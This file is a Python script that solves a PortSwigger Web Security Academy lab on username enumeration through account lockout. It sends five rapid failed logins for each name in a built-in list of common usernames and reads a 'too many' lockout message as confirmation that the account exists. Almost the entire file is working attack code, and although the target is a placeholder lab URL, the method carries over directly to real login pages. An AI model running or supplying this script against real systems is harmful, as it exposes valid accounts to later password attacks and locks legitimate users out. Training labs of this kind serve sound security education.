#!/usr/bin/env python3
"""
Username Enumeration via Account Locking
-----------------------------------------
Technique: Send 5 rapid requests per username.
If the account exists, the server locks it and returns a different error message.
Target: PortSwigger Web Security Academy - "Username enumeration via account lock"

Usage:
    python3 username_enum.py

Requirements:
    pip install requests
"""

import requests
import sys

# CONFIG
TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
SESSION_COOKIE = "YOUR_SESSION_COOKIE"
ATTEMPTS_PER_USER = 5
FIXED_PASSWORD = "invalid"
LOCK_INDICATOR = "too many"

USERNAMES = [
    "carlos","root","admin","test","guest","info","adm","mysql","user","administrator",
    "oracle","ftp","pi","puppet","ansible","ec2-user","vagrant","azureuser","academico",
    "acceso","access","accounting","accounts","acid","activestat","ad","adam","adkit",
    "admin","administracion","administrador","administrator","administrators","admins",
    "ads","adserver","adsl","ae","af","affiliate","affiliates","afiliados","ag","agenda",
    "agent","ai","aix","ajax","ak","akamai","al","alabama","alaska","albuquerque","alerts",
    "alpha","alterwind","am","amarillo","americas","an","anaheim","analyzer","announce",
    "announcements","antivirus","ao","ap","apache","apollo","app","app01","app1","apple",
    "application","applications","apps","appserver","aq","ar","archie","arcsight",
    "argentina","arizona","arkansas","arlington","as","as400","asia","asterix","at",
    "athena","atlanta","atlas","att","au","auction","austin","auth","auto","autodiscover"
]


def enumerate_username(target: str, cookie: str) -> str | None:
    """
    Send ATTEMPTS_PER_USER rapid requests for each username.
    If the server locks the account, the username is valid.

    Args:
        target: Base URL of the target
        cookie: Session cookie value

    Returns:
        Valid username string, or None if not found
    """
    session = requests.Session()
    session.cookies.set("session", cookie)

    print("[*] Starting username enumeration...")
    print(f"[*] Sending {ATTEMPTS_PER_USER} requests per username\n")

    for username in USERNAMES:
        last_response = None

        for _ in range(ATTEMPTS_PER_USER):
            try:
                last_response = session.post(
                    f"{target}/login",
                    data={"username": username, "password": FIXED_PASSWORD},
                    allow_redirects=False,
                    timeout=10
                )
            except requests.RequestException as e:
                print(f"[!] Request error for '{username}': {e}")
                break

        if last_response and LOCK_INDICATOR in last_response.text.lower():
            print(f"[+] Valid username found: {username}")
            return username
        else:
            print(f"[-] {username}")

    return None


def main():
    print("=" * 50)
    print(" Username Enumeration via Account Locking")
    print("=" * 50 + "\n")

    if TARGET == "https://YOUR-LAB-ID.web-security-academy.net":
        print("[!] Please set TARGET and SESSION_COOKIE before running.")
        sys.exit(1)

    username = enumerate_username(TARGET, SESSION_COOKIE)

    if username:
        print(f"\n[+] Done. Valid username: {username}")
    else:
        print("\n[-] No valid username found.")
        print("[*] Try refreshing your session cookie or check the TARGET URL.")


if __name__ == "__main__":
    main()